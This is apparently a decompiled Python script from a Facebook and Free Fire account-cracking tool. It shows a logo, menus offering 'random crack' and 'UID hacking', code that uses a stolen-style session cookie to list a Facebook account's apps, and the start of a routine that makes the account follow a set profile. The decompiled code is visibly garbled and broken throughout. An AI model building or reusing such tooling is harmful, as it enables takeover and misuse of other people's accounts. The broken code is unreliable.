MOHAMMAD ABIR HOSSAIN 1 message removedcontent: # Source Generated with Decompyle++
# File: test.pyc (Python 3.9)
#If You Wanna Take Credits For This Code, Please Look Yourself Again...

import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')

class jalan:
    
    def __init__(self, z):
        pass


logo = '   \1b[1;32m       888    d8P  8888888b.   .d8888b.  \1b[1;35m       888   d8P   888   Y88b d88P  Y88b \1b[1;35m       888  d8P    888    888 Y88b.      \1b[1;32m       888d88K     888   d88P  "Y888b.   \1b[1;32m       8888888b    8888888P"      "Y88b. \1b[1;35m       888  Y88b   888 T88b         "888 \1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \\b[1;37m================= \b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVx1b[0;m\b[1;32m && \b[1;33mKASHIF\b[0;m\1b[1;32m     \b[1;32mFACEBOK      : \b[1;34m ArYan KhAn\1b[1;32m     \b[1;35mGITHUB       :  \b[1;35mTEAM-KRS\1b[1;32m     \b[1;36mTOOL STATUS  :  \b[1;36mTOOL IS FREE\1b[1;32m     \b[1;35mTEAM         :  \b[1;35mKRS\1b[1;32m     \b[1;36mTOOL VIRSION :  \b[1;36m2.3\1b[1;37m================= \b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV================== \b[32;45mNIDA\b[0;m ======================\

def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] FOLLOW MY FACEBOOK')
    print(' [2] EXIT')
    opt = input('\  Choose option >>> ')
    if opt == '1':
        os.system('https://www.facebook.com/profile.php?id=100084444625050')
        FD()
        return None
    None('\1b[1;31mEXIT\b[0;97m')


def FD():
    os.system('clear')
    print(logo)
    print('\b[1;33m [1] FOLLOW MY FACEBOOK')
    print(' [2] EXIT')
    opt = input('\ \b[1;32m Choose option >>> ')
    if opt == '1':
        ('www.facebook.com/Kyadakrahyho1')
        o()
        return None
    None('\1b[1;31mEXIT\b[0;97m')


def o():
    os.system('clear')
    jalan(logo)
    jalan('\???RANDOM NUMBER CRACK????')
    print('')
    jalan('\b[1;32m [1]\b[1;33m FF ID RANDOM CRACK ')
    jalan(' \b[1;32m[2] \b[1;32mFOLLOW UID TARGET ')
    jalan(' \b[1;32m[3] \b[1;32mFOLLOW FF UID HACKING')
    jalan(' \b[1;32m[00] \b[1;31mEXIT')
    opt = input('\  \b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if opt == '2':
        i()
        return None
    if None == '3':
       i()
        return None
    if None == '4':
        os.system('www.facebook.com/Kyadakrahyho1/')
        return None
    if None == '0':
        os.system('exit')
        return None
    None('\1b[1;31m  Choose valid option\b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\??] %s \b[1;95m ? Your Active Apps ?     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\%s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\s[%s!%s] %sSorry there is no Expired Apk%s           \%(N,M,N,M,N))
    else:
        print(f'\??] %s \b[1;95m ? Your Expired Apps ?    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie':